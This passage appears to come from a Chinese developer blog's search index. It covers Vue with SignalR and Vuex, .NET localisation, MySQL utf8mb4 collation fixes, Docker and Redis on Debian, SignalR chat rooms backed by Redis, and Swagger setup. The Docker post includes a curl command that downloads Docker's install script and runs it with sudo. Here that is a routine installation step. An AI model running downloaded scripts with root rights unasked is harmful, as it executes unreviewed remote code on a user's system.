=\u0026gt; { this.messages.push({ user, message }); }); } } \u0026lt;/script\u0026gt; /chatHub 是服务端通讯地址\nSignalR服务端 👉 .NET SignalR Redis\n3.在模板中显示消息 最后，在你的Vue模板中显示从SignalR收到的消息。\n\u0026lt;template\u0026gt; \u0026lt;div\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; v-model=\u0026#34;messageText\u0026#34;\u0026gt; \u0026lt;button @click=\u0026#34;sendMessage\u0026#34;\u0026gt;Send\u0026lt;/button\u0026gt; \u0026lt;br\u0026gt; \u0026lt;div v-for=\u0026#34;(message, index) in messages\u0026#34; :key=\u0026#34;index\u0026#34;\u0026gt; \u0026lt;p\u0026gt;{{ message.user }}: {{ message.message }}\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 这里创建了一个messageTex 获取用户输入的文本点击按钮Send时，会调用sendMessage 方法来发送消息给SignalR Hub。并将输入框中的消息作为参数传递给它。\n4.运行实例 可以看到消息实时传递到另一个客户端 ​​\nVuex Vuex 是 Vue.js 的状态管理库，用于集中管理应用的状态\n用于全局状态管理 数据共享\n1.安装Vuex npm install vuex ​​\n2.导入依赖 import { createStore } from \u0026#39;vuex\u0026#39;; 这里做个简单的登录Vuex store例子\nimport { createStore } from \u0026#39;vuex\u0026#39;; import api from \u0026#39;../services/api\u0026#39;; export default createStore({ state: { isLoggedIn: false, user: null }, mutations: { login(state, user) { state.isLoggedIn = true; state.user = user; }, logout(state) { state.isLoggedIn = false; state.user = null; } }, actions: { async login({ commit }, loginForm) { try { const response = await api.post(\u0026#39;/api/userApi/GetUserByMobilePwd\u0026#39;, loginForm); // 登录成功，更新用户信息并设置登录状态 commit(\u0026#39;login\u0026#39;, response.data.rsData); //rsData return response.data; } catch (error) { // 登录失败，抛出错误 throw new Error(error.response.data.message || \u0026#39;Login failed\u0026#39;); } }, logout({ commit }) { // 清除用户信息并设置登录状态为未登录 commit(\u0026#39;logout\u0026#39;); } } }); state 对象包含应用的全局状态，其中 isLoggedIn 是否已经登录，user 存储用户信息。\nmutations\nlogin 方法用于将用户登录状态设置为已登录，并存储用户信息，\nlogout 方法用于将用户登录状态设置为未登录，并清空用户信息。\nactions\nlogin 方法用于发起登录请求，并根据响应结果提交 login mutation 来更新用户登录状态和用户信息，\nlogout 方法用于处理用户登出逻辑。\ngetters 包含一些计算属性，用于从 state 中派生出一些衍生状态。\n这里的 isLoggedIn getter 返回 state.isLoggedIn，以确保状态的响应性。\n3.在Vue组件中使用 //main.js import store from \u0026#39;./services/store.js\u0026#39;; ... app.provide(\u0026#39;store\u0026#39;, store) // 注入 Vuex store 4.编写组件 login logout\n\u0026lt;template\u0026gt; \u0026lt;div class=\u0026#34;login-container\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;login-card\u0026#34;\u0026gt; \u0026lt;h2 class=\u0026#34;login-title\u0026#34; style=\u0026#34;margin-top: ;\u0026#34;\u0026gt;{{ $t(\u0026#39;Login\u0026#39;) }}\u0026lt;/h2\u0026gt; \u0026lt;form @submit.prevent=\u0026#34;login\u0026#34; class=\u0026#34;login-form\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;mobile\u0026#34;\u0026gt;{{ $t(\u0026#39;username\u0026#39;) }}\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;mobile\u0026#34; v-model=\u0026#34;loginForm.mobile\u0026#34; \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;form-group\u0026#34;\u0026gt; \u0026lt;label for=\u0026#34;pwd\u0026#34;\u0026gt;{{ $t(\u0026#39;password\u0026#39;) }}\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;password\u0026#34; id=\u0026#34;pwd\u0026#34; v-model=\u0026#34;loginForm.pwd\u0026#34; \u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button v-if=\u0026#34;!isLoggedIn\u0026#34; type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;{{ $t(\u0026#39;Login\u0026#39;) }}\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;div v-if=\u0026#34;isLoggedIn\u0026#34; class=\u0026#34;user-info\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Welcome, {{ user \u0026amp;\u0026amp; user.UserName }}!\u0026lt;/p\u0026gt; \u0026lt;button @click=\u0026#34;logout\u0026#34; class=\u0026#34;btn btn-danger\u0026#34;\u0026gt;{{ $t(\u0026#39;Logout\u0026#39;) }}\u0026lt;/button\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- 添加按钮用于测试 \u0026lt;button @click=\u0026#34;checkIsLoggedIn\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;Check isLoggedIn\u0026lt;/button\u0026gt; --\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/template\u0026gt; 5.编写脚本 Vue3 setup() 函数设置组件逻辑\nexport default { setup() { const store = useStore(); const loginForm = ref({ mobile: \u0026#39;\u0026#39;, pwd: \u0026#39;\u0026#39; }); const isLoggedIn = computed(() =\u0026gt; store.state.isLoggedIn); // 使用 computed 获取响应式的 isLoggedIn const user = computed(() =\u0026gt; store.state.user); // 使用 computed 获取响应式的 user const login = async () =\u0026gt; { try { console.log(\u0026#39;isLoggedIn before login:\u0026#39;, isLoggedIn.value); // 在调用接口前输出 isLoggedIn const result = await store.dispatch(\u0026#39;login\u0026#39;, loginForm.value); if (result) { console.log(\u0026#39;Login successful\u0026#39;); console.log(\u0026#39;isLoggedIn after login:\u0026#39;, isLoggedIn.value); // 在调用接口后输出 isLoggedIn } else { console.error(\u0026#39;Login failed: Login unsuccessful\u0026#39;); } } catch (error) { console.error(\u0026#39;Login failed:\u0026#39;, error.message); } }; const logout = async () =\u0026gt; { try { await store.dispatch(\u0026#39;logout\u0026#39;); console.log(\u0026#39;Logout successful\u0026#39;); } catch (error) { console.error(\u0026#39;Logout failed:\u0026#39;, error.message); } }; // 新增方法用于测试 const checkIsLoggedIn = () =\u0026gt; { console.log(\u0026#39;isLoggedIn:\u0026#39;, isLoggedIn.value); }; return { loginForm, login, logout, isLoggedIn, user, checkIsLoggedIn }; } }; \u0026lt;/script\u0026gt; 当 isLoggedIn 在 mutations 中被修改时，组件中使用该属性的地方会立即更新。\n6.运行实例 ​​\n当然，还有很多组件值得学习。\n愿在前端的旅程，不断进步！🐶\n","permalink":"https://qfsyso.github.io/posts/vue-study/","summary":"前言 Vue.js，这个轻量级且灵活的JavaScript框架，就像一位魔术师，用它的魔法棒将数据和视图巧妙地连接在一起。当数据发生变化时，Vue.js就像变魔术一样，让视图自动更新，为开发者带来了极大的便利。\nVue.js的诞生，源于一位名叫尤雨溪的开发者对前端开发的热爱与追求。在Google工作期间，他受到了Angular的启发，决定开发一款更加轻量、灵活的框架。于是，Vue.js应运而生，它的名字来源于“View”的缩写，寓意着它专注于视图层的开发。Vue.js不断地完善和发展。它引入了响应式数据绑定、组件化开发等核心概念，让前端开发变得更加高效和可维护。\n👋 Vue环境搭建 首先，搭一个打代码的环境\n1.安装node.js 在使用VS Code之前，需要安装Vue的开发环境。\n安装Vue的最简单方法是使用npm包管理器，先安装Node.js和npm。\nnode官网 =\u0026gt; https://nodejs.org/en/download\n2.配置环境变量 在nodejs安装目录下新建node_cache（nodejs缓存）、node_global（全局包存放）两个文件夹，如下图所示。\n​​\n打开cmd命令提示符，配置文件路径如下：\n​​\n配置环境变量\n​​\n系统属性-\u0026gt;高级-\u0026gt;环境变量-\u0026gt;新增环境变量： ​​\n系统变量 ​​\n​​\n3.VSCode配置 Visual Studio Code\n以管理员身份运行VSCode\nVSCode安装插件ESLint\n安装js打包工具\nnpm install -g webpack ​​\n​​\n4.安装Vue CLI npm install -g vue-cli (vue-cli npm install @vue/cli -g --unsafe-perm) 5.在VS Code中打开Vue项目 5.1. 在VS Code中，File \u0026gt; Open Folder\u0026hellip; 选择“文件”\u0026gt; “打开文件夹”。 ​​\n5.2. 找到Vue项目文件夹，选择“文件夹”并打开。 ​​\n可以根据需要，在Extensions安装VSCode的中文扩展。\n5.3也可以通过Vue UI 创建一个新的Vue项目然后打开 vue ui ​​","title":"Vue study"},{"content":"环境 WIN10 VS2022 .NET8\n👋创建项目 ​\n👀创建Resources Controllers HomeController.en.resx\n​ HomeController.fr.resx\n​ HomeController.zh.resx\n​\n🌱Program.cs添加国际化支持 // 添加国际化支持 builder.Services.AddLocalization(options =\u0026gt; { options.ResourcesPath = \u0026#34;Resources\u0026#34;; }); var app = builder.Build(); // 多语言 var supportedCultures = new List\u0026lt;CultureInfo\u0026gt; { new CultureInfo(\u0026#34;en\u0026#34;), new CultureInfo(\u0026#34;zh\u0026#34;), new CultureInfo(\u0026#34;fr\u0026#34;), }; app.UseRequestLocalization(new RequestLocalizationOptions { DefaultRequestCulture = new RequestCulture(\u0026#34;zh\u0026#34;), SupportedCultures = supportedCultures, SupportedUICultures = supportedCultures }); ⚡注入localizer private readonly IStringLocalizer\u0026lt;HomeController\u0026gt; localizer; public HomeController(ILogger\u0026lt;HomeController\u0026gt; logger, IStringLocalizer\u0026lt;HomeController\u0026gt; localizer) { _logger = logger; this.localizer = localizer; } ``` # 📫编写调用方法 [HttpGet] public ActionResult\u0026lt;string\u0026gt; Get() { string rsstr= localizer.GetString(\u0026#34;String1\u0026#34;).Value;//?ui-culture=zh return rsstr; } 默认是中文 ?ui-culture=en 则取对应HomeController.en.resx 里面的String1 ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041306.jpg\u0026#34;\u0026gt; ​\u0026lt;img onerror=\u0026#34;notfound(this);\u0026#34; src=\u0026#34;https://cdn.jsdelivr.net/gh/qfsysw/resources/v2/2024041307.jpg\u0026#34;\u0026gt; 🐟 ","permalink":"https://qfsyso.github.io/posts/.net-i18n/","summary":"环境 WIN10 VS2022 .NET8\n👋创建项目 ​\n👀创建Resources Controllers HomeController.en.resx\n​ HomeController.fr.resx\n​ HomeController.zh.resx\n​\n🌱Program.cs添加国际化支持 // 添加国际化支持 builder.Services.AddLocalization(options =\u0026gt; { options.ResourcesPath = \u0026#34;Resources\u0026#34;; }); var app = builder.Build(); // 多语言 var supportedCultures = new List\u0026lt;CultureInfo\u0026gt; { new CultureInfo(\u0026#34;en\u0026#34;), new CultureInfo(\u0026#34;zh\u0026#34;), new CultureInfo(\u0026#34;fr\u0026#34;), }; app.UseRequestLocalization(new RequestLocalizationOptions { DefaultRequestCulture = new RequestCulture(\u0026#34;zh\u0026#34;), SupportedCultures = supportedCultures, SupportedUICultures = supportedCultures }); ⚡注入localizer private readonly IStringLocalizer\u0026lt;HomeController\u0026gt; localizer; public HomeController(ILogger\u0026lt;HomeController\u0026gt; logger, IStringLocalizer\u0026lt;HomeController\u0026gt; localizer) { _logger = logger; this.","title":".NET i18n "},{"content":"MySQL存储IOS传过来emoji错误处理 Incorrect string value: ‘‘ for column ‘xxx‘ at row MySQL Incorrect string value: ‘\\xF0\\x9F\\x8D\\xBA‘ for column ‘xxx‘ at row\n​\n调用接口提示\nIncorrect string value: \u0026lsquo;\\xF0\\x9F\\x8D\\xBA\u0026rsquo; for column \u0026lsquo;xxx\u0026rsquo; at row\n😵‍💫\n需要把mysql字段排序规则\nutf8mb4_0900_ai_ci\n改成\nutf8mb4_unicode_ci\n​\n💤SQL调整 ALTER TABLE MUser CHANGE Signature Signature VARCHAR(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL;\n设置该列的字符集为utf8mb4。utf8mb4是MySQL中的一个字符集，它可以存储四字节的UTF-8字符，因此可以支持更多的Unicode字符，如某些表情符号。 设置该列的校对规则为utf8mb4_unicode_ci。校对规则决定了字符如何比较和排序。utf8mb4_unicode_ci是一个不区分大小写的校对规则，它基于Unicode标准。 ALTER DATABASE IDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci;\n设置该数据库的字符集为utf8mb4。\n设置该数据库的校对规则为utf8mb4_unicode_ci。\n​\n💤服务端连接调整 ChatSet utf8mb4\n​\n💤Runing ​\n​\n","permalink":"https://qfsyso.github.io/posts/mysql-incorrect-string-value/","summary":"MySQL存储IOS传过来emoji错误处理 Incorrect string value: ‘‘ for column ‘xxx‘ at row MySQL Incorrect string value: ‘\\xF0\\x9F\\x8D\\xBA‘ for column ‘xxx‘ at row\n​\n调用接口提示\nIncorrect string value: \u0026lsquo;\\xF0\\x9F\\x8D\\xBA\u0026rsquo; for column \u0026lsquo;xxx\u0026rsquo; at row\n😵‍💫\n需要把mysql字段排序规则\nutf8mb4_0900_ai_ci\n改成\nutf8mb4_unicode_ci\n​\n💤SQL调整 ALTER TABLE MUser CHANGE Signature Signature VARCHAR(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL;\n设置该列的字符集为utf8mb4。utf8mb4是MySQL中的一个字符集，它可以存储四字节的UTF-8字符，因此可以支持更多的Unicode字符，如某些表情符号。 设置该列的校对规则为utf8mb4_unicode_ci。校对规则决定了字符如何比较和排序。utf8mb4_unicode_ci是一个不区分大小写的校对规则，它基于Unicode标准。 ALTER DATABASE IDB CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci;\n设置该数据库的字符集为utf8mb4。\n设置该数据库的校对规则为utf8mb4_unicode_ci。\n​\n💤服务端连接调整 ChatSet utf8mb4","title":"MySQL Incorrect string value "},{"content":"Debian安装docker\n1.使用官方脚本自动安装docker 安装命令如下：\ncurl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 如果安装提示\n-bash sudo command not found\n则需要\n#update sudo apt-get update sudo apt-get install sudo 再执行安装脚本1\n安装成功后可以输入 docker命令查看docker版本\n#version docker --version 能查到表明安装成功\n2.pull redis #pull redis docker pull redis:latest pull redis镜像 3.创建reids容器 docker run -itd --name redis-test -p 6379:6379 redis 4.测试redis docker exec -it redis-test /bin/bash redis-cli set test 1 get test set test 1 提示ok\nget test 一些命令\n#images docker images #redis docker pull redis:latest docker run -itd --name redis-test -p 6379:6379 redis #test redis docker exec -it redis-test /bin/bash - redis-cli set test 1 get test 持久化\ndocker run --name some-redis -p 6379:6379 -v /path/to/redis/data:/data -d redis 这里的 /path/to/redis/data 是你本地的一个路径，/data 是容器内 Redis 数据存储的默认位置。 -v 参数来挂载一个本地目录作为数据卷\n所有key 在redis-cli提示符下，你可以使用以下命令来查看所有的key：\nKEYS * ","permalink":"https://qfsyso.github.io/posts/debian-docker-redis/","summary":"Debian安装docker\n1.使用官方脚本自动安装docker 安装命令如下：\ncurl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 如果安装提示\n-bash sudo command not found\n则需要\n#update sudo apt-get update sudo apt-get install sudo 再执行安装脚本1\n安装成功后可以输入 docker命令查看docker版本\n#version docker --version 能查到表明安装成功\n2.pull redis #pull redis docker pull redis:latest pull redis镜像 3.创建reids容器 docker run -itd --name redis-test -p 6379:6379 redis 4.测试redis docker exec -it redis-test /bin/bash redis-cli set test 1 get test set test 1 提示ok\nget test 一些命令","title":"Debian Docker Redis"},{"content":"环境 Win10 VS2022 .NET8 Docker Redis\n前言\n什么是 SignalR？ ASP.NET Core SignalR 是一个开放源代码库，可用于简化向应用添加实时 Web 功能。 实时 Web 功能使服务器端代码能够将内容推送到客户端。\n适合 SignalR 的候选项：\n需要从服务器进行高频率更新的应用。 （游戏、社交网络、投票、拍卖、地图和 GPS 应用） 仪表板和监视应用。 （公司仪表板、即时销售更新或出行警报） 协作应用。 （包括白板应用和团队会议软件） 需要通知的应用。（ 社交网络、电子邮件、聊天、游戏等） SignalR 提供用于创建服务器到客户端的远程过程调用 (RPC) API。 RPC 从服务器端 .NET Core 代码调用客户端上的函数。支持JavaScript ，.NET ，JAVA，Swift （官方没有明确支持，这是第三方库）其中每个平台都有各自的客户端 SDK。 因此，RPC 调用所调用的编程语言有所不同。\nASP.NET Core SignalR 的一些功能：\n自动处理连接管理。 同时向所有连接的客户端发送消息。 例如聊天室。 向特定客户端或客户端组发送消息。 对其进行缩放，以处理不断增加的流量。 SignalR 中心协议 1.👋nuget引入SignalR ​​ ​\n2.👀创建SignalR Hub\nusing Microsoft.AspNetCore.SignalR; using System.Threading.Tasks; namespace WebSignalR { public class ChatHub : Hub { public async Task SendMessage(string user, string message) { await Clients.All.SendAsync(\u0026#34;ReceiveMessage\u0026#34;, user, message); } } } 3.🌱 Program.cs添加SignalR服务 (Startup.cs)\n//添加SignalR服务 builder.Services.AddSignalR(); builder.Services.AddControllersWithViews(); app.UseEndpoints(endpoints =\u0026gt; { endpoints.MapHub\u0026lt;ChatHub\u0026gt;(\u0026#34;/chathub\u0026#34;); endpoints.MapControllerRoute( name: \u0026#34;default\u0026#34;, pattern: \u0026#34;{controller=Home}/{action=Index}/{id?}\u0026#34;); }); 4.📫 添加前端代码\n\u0026lt;div class=\u0026#34;text-center\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;chat-container\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;userInput\u0026#34; placeholder=\u0026#34;Your name\u0026#34; /\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; id=\u0026#34;messageInput\u0026#34; placeholder=\u0026#34;Type a message...\u0026#34; /\u0026gt; \u0026lt;button id=\u0026#34;sendButton\u0026#34;\u0026gt;Send\u0026lt;/button\u0026gt; \u0026lt;ul id=\u0026#34;messagesList\u0026#34;\u0026gt;\u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script src=\u0026#34;https://cdnjs.cloudflare.com/ajax/libs/microsoft-signalr/5.0.12/signalr.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script\u0026gt; const connection = new signalR.HubConnectionBuilder() .withUrl(\u0026#34;/chathub\u0026#34;) .build(); connection.on(\u0026#34;ReceiveMessage\u0026#34;, function (user, message) { const encodedUser = user.replace(/\u0026amp;/g, \u0026#34;\u0026amp;amp;\u0026#34;).replace(/\u0026lt;/g, \u0026#34;\u0026amp;lt;\u0026#34;).replace(/\u0026gt;/g, \u0026#34;\u0026amp;gt;\u0026#34;); const encodedMessage = message.replace(/\u0026amp;/g, \u0026#34;\u0026amp;amp;\u0026#34;).replace(/\u0026lt;/g, \u0026#34;\u0026amp;lt;\u0026#34;).replace(/\u0026gt;/g, \u0026#34;\u0026amp;gt;\u0026#34;); const li = document.createElement(\u0026#34;li\u0026#34;); li.textContent = `${encodedUser}: ${encodedMessage}`; document.getElementById(\u0026#34;messagesList\u0026#34;).appendChild(li); }); connection.start().catch(function (err) { return console.error(err.toString()); }); document.getElementById(\u0026#34;sendButton\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function (event) { const user = document.getElementById(\u0026#34;userInput\u0026#34;).value; const message = document.getElementById(\u0026#34;messageInput\u0026#34;).value; connection.invoke(\u0026#34;SendMessage\u0026#34;, user, message).catch(function (err) { return console.error(err.toString()); }); event.preventDefault(); }); \u0026lt;/script\u0026gt; \u0026lt;/div\u0026gt; 5.⚡F5运行 ​ ​ ​\n升级优化\n封装Msg\npublic class Msg { public string? user { get; set; } public string? message { get; set; } } //sendMessage public async Task SendMessage(Msg entity) { if (Clients != null) await Clients.All.SendAsync(\u0026#34;ReceiveMessage\u0026#34;, entity.user, entity.message);// $\u0026#34;{entity.user} 发送消息：{entity.message}\u0026#34;); } ``` 前端 connection.invoke(\u0026#34;SendMessage\u0026#34; ... 传递msg对象进来即可 6.💪跨域问题 ``` c# builder.Services.AddCors(options =\u0026gt; { options.AddPolicy(\u0026#34;CorsPolicy\u0026#34;, builder =\u0026gt; builder .AllowAnyMethod() .AllowAnyHeader() .WithOrigins(\u0026#34;http://localhost:5173\u0026#34;) // 替换为你允许的来源 .AllowCredentials()); }); //通过添加app.UseCors(\u0026#34;CorsPolicy\u0026#34;)中间件来启用跨域支持 app.UseCors(\u0026#34;CorsPolicy\u0026#34;); 上面代码中的WithOrigins方法指定了允许访问SignalR端点的来源。将​\u0026quot;http://localhost:5173\u0026quot;替换为你允许的实际来源。如果要允许任何来源访问，可以使用通配符\u0026quot;*\u0026quot;。​\n这样就可以跨域访问 👇Vue跨域\n​​\n7.🧙‍♂️聊天池的实现 实际生产可能需要1对1或者多对多，可在后端建立一个字典，将聊天池的标识映射到该聊天池的连接ID列表。\npublic Dictionary\u0026lt;string, List\u0026lt;string\u0026gt;\u0026gt; _chatRooms = new Dictionary\u0026lt;string, List\u0026lt;string\u0026gt;\u0026gt;(); public async Task JoinChatRoom(string chatRoomId) { // 将用户连接添加到特定的聊天池 if (!MsgSt._chatRooms2.ContainsKey(chatRoomId)) { MsgSt._chatRooms2[chatRoomId] = new List\u0026lt;string\u0026gt;(); } MsgSt._chatRooms2[chatRoomId].Add(Context.ConnectionId); // int i = _chatRooms.Count; Console.WriteLine(\u0026#34;chatRoomId-Cid\u0026#34; + chatRoomId + \u0026#34; \u0026#34; + Context.ConnectionId); } public async Task SendMessageToChatRoom(string chatRoomId, string user, string message) { // Console.WriteLine(connectionIds); // 向特定的聊天池发送消息 if (MsgSt._chatRooms2.TryGetValue(chatRoomId, out var connectionIds)) { foreach (var connectionId in connectionIds) { await Clients.Client(connectionId).SendAsync(\u0026#34;ReceiveMessage\u0026#34;,user, message); } } // await Clients.Client(connectionId).SendAsync(\u0026#34;ReceiveMessage\u0026#34;, message); } public class MsgSt { public static Dictionary\u0026lt;string, List\u0026lt;string\u0026gt;\u0026gt; _chatRooms2= new Dictionary\u0026lt;string, List\u0026lt;string\u0026gt;\u0026gt;(); //public static int temp2 = 0; } 在前端发送消息时，除了发送消息内容外，还要发送消息到的聊天池的标识。\nJoinChatRoom SendMessageToChatRoom\n\u0026lt;script\u0026gt; const connection = new signalR.HubConnectionBuilder() .withUrl(\u0026#34;/chathub\u0026#34;) .build(); const userId = \u0026#34;userid001\u0026#34;; const chatRoomId = \u0026#34;room001\u0026#34;; // 聊天池标识 connection.on(\u0026#34;ReceiveMessage\u0026#34;, function (user, message) { const encodedUser = user.replace(/\u0026amp;/g, \u0026#34;\u0026amp;amp;\u0026#34;).replace(/\u0026lt;/g, \u0026#34;\u0026amp;lt;\u0026#34;).replace(/\u0026gt;/g, \u0026#34;\u0026amp;gt;\u0026#34;); const encodedMessage = message.replace(/\u0026amp;/g, \u0026#34;\u0026amp;amp;\u0026#34;).replace(/\u0026lt;/g, \u0026#34;\u0026amp;lt;\u0026#34;).replace(/\u0026gt;/g, \u0026#34;\u0026amp;gt;\u0026#34;); const li = document.createElement(\u0026#34;li\u0026#34;); li.textContent = `${encodedUser}: ${encodedMessage}`; document.getElementById(\u0026#34;messagesList\u0026#34;).appendChild(li); }); connection.start().then(() =\u0026gt; { console.log(\u0026#34;Connection started\u0026#34; +chatRoomId); connection.invoke(\u0026#34;JoinChatRoom\u0026#34;, chatRoomId); // 加入特定的聊天池 }).catch(err =\u0026gt; console.error(err)); document.getElementById(\u0026#34;sendButton\u0026#34;).addEventListener(\u0026#34;click\u0026#34;, function (event) { const message = document.getElementById(\u0026#34;messageInput\u0026#34;).value; const user = document.getElementById(\u0026#34;userInput\u0026#34;).value; connection.invoke(\u0026#34;SendMessageToChatRoom\u0026#34;, chatRoomId, user, message).catch(function (err) { return console.error(err.toString()); }); event.preventDefault(); }); \u0026lt;/script\u0026gt; chatroom1\n​ ​ ​\n8.☔断线重连 确保客户端在与 SignalR Hub 的连接断开后能够重新连接并恢复之前的状态\n可以在客户端代码中实现重连逻辑\nlet isConnected = false; // 用于标识是否已连接 // 连接成功时将 isConnected 设置为 true connection.onclose(() =\u0026gt; { isConnected = false; }); async function startConnection() { try { await connection.start(); console.log(\u0026#34;Connection started\u0026#34;); isConnected = true; } catch (err) { console.error(err); isConnected = false; // 连接失败时尝试重新连接 setTimeout(startConnection, 5000); // 5秒后重试 } } startConnection(); // 初始连接 9.🌠配置Redis分布式缓存 Docker Redis 👈 Redis部署\n用 Microsoft.Extensions.Caching.StackExchangeRedis 包连接到 Redis 并使用分布式缓存。这样可以确保即使服务重启，也能够保留聊天室的状态。\n安装 Microsoft.Extensions.Caching.StackExchangeRedis\n​​\nor StackExchange.Redis\n​​\nProgram.cs\n// 添加Redis缓存 builder.Services.AddStackExchangeRedisCache(options =\u0026gt; { options.Configuration = \u0026#34;127.0.0.1:6379\u0026#34;; // Redis服务器地址 options.InstanceName = \u0026#34;ChatRooms\u0026#34;; // 实例名称 }); options.Configuration 设置为 Redis 服务器的地址，如果 Redis 运行在本地，则可以设置为 \u0026ldquo;localhost\u0026rdquo;。options.InstanceName 是 Redis 实例名称。\n启动Redis服务\n在 ChatHub 中注入 IDistributedCache，连接到 Redis\n_cache相当于 _chatRooms2存放连接ID的列表\nprivate readonly IDistributedCache _cache; public ChatHub(IDistributedCache cache) { _cache = cache; } public async Task JoinChatRoom(string chatRoomId) { // 使用Redis的SET操作来添加连接ID到聊天室 var connectionId = Context.ConnectionId; var key = $\u0026#34;chatrooms:{chatRoomId}\u0026#34;; var connectionIds = await _cache.GetStringAsync(key); var connectionsList = string.IsNullOrEmpty(connectionIds) ? new List\u0026lt;string\u0026gt;() : connectionIds.Split(new[] { \u0026#39;,\u0026#39; }, StringSplitOptions.RemoveEmptyEntries).ToList(); connectionsList.Add(connectionId); await _cache.SetStringAsync(key, string.Join(\u0026#34;,\u0026#34;, connectionsList)); Console.WriteLine($\u0026#34;chatRoomId-Cid {chatRoomId} {connectionId}\u0026#34;); } public async Task SendMessageToChatRoom(string chatRoomId, string user, string message) { var key = $\u0026#34;chatrooms:{chatRoomId}\u0026#34;; var connectionIds = await _cache.GetStringAsync(key); if (!string.IsNullOrEmpty(connectionIds)) { var connectionsList = connectionIds.Split(new[] { \u0026#39;,\u0026#39; }, StringSplitOptions.RemoveEmptyEntries); foreach (var connectionId in connectionsList) { await Clients.Client(connectionId).SendAsync(\u0026#34;ReceiveMessage\u0026#34;, user, message); } } } 这样前端传过来的 room001 room002 便会存入到Redis里面\n运行调试的时候可以看到有用户JionChatRoom的chatRoomId connectionId\n​\n也可通过Redis命令 KEY * 查看\n​\nPS：这里用简单的字符串来存储连接ID的列表，连接ID之间用逗号分隔，实际生产可使用Redis的集合（Set）数据类型来存储连接ID，还需处理Redis连接失败、缓存过期等异常情况。\n","permalink":"https://qfsyso.github.io/posts/.net-signalr-redis/","summary":"环境 Win10 VS2022 .NET8 Docker Redis\n前言\n什么是 SignalR？ ASP.NET Core SignalR 是一个开放源代码库，可用于简化向应用添加实时 Web 功能。 实时 Web 功能使服务器端代码能够将内容推送到客户端。\n适合 SignalR 的候选项：\n需要从服务器进行高频率更新的应用。 （游戏、社交网络、投票、拍卖、地图和 GPS 应用） 仪表板和监视应用。 （公司仪表板、即时销售更新或出行警报） 协作应用。 （包括白板应用和团队会议软件） 需要通知的应用。（ 社交网络、电子邮件、聊天、游戏等） SignalR 提供用于创建服务器到客户端的远程过程调用 (RPC) API。 RPC 从服务器端 .NET Core 代码调用客户端上的函数。支持JavaScript ，.NET ，JAVA，Swift （官方没有明确支持，这是第三方库）其中每个平台都有各自的客户端 SDK。 因此，RPC 调用所调用的编程语言有所不同。\nASP.NET Core SignalR 的一些功能：\n自动处理连接管理。 同时向所有连接的客户端发送消息。 例如聊天室。 向特定客户端或客户端组发送消息。 对其进行缩放，以处理不断增加的流量。 SignalR 中心协议 1.👋nuget引入SignalR ​​ ​\n2.👀创建SignalR Hub\nusing Microsoft.AspNetCore.SignalR; using System.Threading.Tasks; namespace WebSignalR { public class ChatHub : Hub { public async Task SendMessage(string user, string message) { await Clients.","title":".NET SignalR Redis "},{"content":"开发环境 Win10 VS2022 .NET8.0\n1.从NuGet添加Swagger ​\n在解决方案资源管理器中右键单击项目\u0026gt;管理 NuGet 包 将包源设置为“nuget.org” 确保启用“包括预发行”选项 在搜索框中输入“Swashbuckle.AspNetCore” 从“浏览”选项卡中选择最新的“Swashbuckle.AspNetCore”包，然后单击“安装”\n2.将 Swagger 生成器添加到以下位置的服务集合中Program.cs： builder.Services.AddControllers(); builder.Services.AddEndpointsApiExplorer(); builder.Services.AddSwaggerGen(); ​\n启用中间件 生成\napp.UseSwagger(); app.UseSwaggerUI(); app.UseSwaggerUI(options =\u0026gt; { options.SwaggerEndpoint(\u0026#34;/swagger/v1/swagger.json\u0026#34;, \u0026#34;v1\u0026#34;); options.RoutePrefix = string.Empty; }); ​\n3.添加API控制器 创建api\n// GET api/\u0026lt;myapi\u0026gt;/5 /// \u0026lt;summary\u0026gt; /// getid /// \u0026lt;/summary\u0026gt; /// \u0026lt;param name=\u0026#34;id\u0026#34;\u0026gt;id参数\u0026lt;/param\u0026gt; /// \u0026lt;returns\u0026gt;valuestr\u0026lt;/returns\u0026gt; [HttpGet(\u0026#34;{id}\u0026#34;)] public string Get(int id) { return \u0026#34;value\u0026#34; + id; } // POST api/\u0026lt;myapi\u0026gt; [HttpPost] public string Post([FromBody] string value) { //post逻辑代码 return \u0026#34;myPost\u0026#34;; } // PUT api/\u0026lt;myapi\u0026gt;/5 [HttpPut(\u0026#34;{id}\u0026#34;)] public string Put(int id, [FromBody] string value) { //put逻辑代码 return \u0026#34;myPut\u0026#34;; } // DELETE api/\u0026lt;myapi\u0026gt;/5 [HttpDelete(\u0026#34;{id}\u0026#34;)] public string Delete(int id) { //delete逻辑代码 return \u0026#34;myDelete\u0026#34;; } ​\n4.F5运行 访问/swagger/index.html ​\n5.try it out测试API ​\n看到返回了 value111 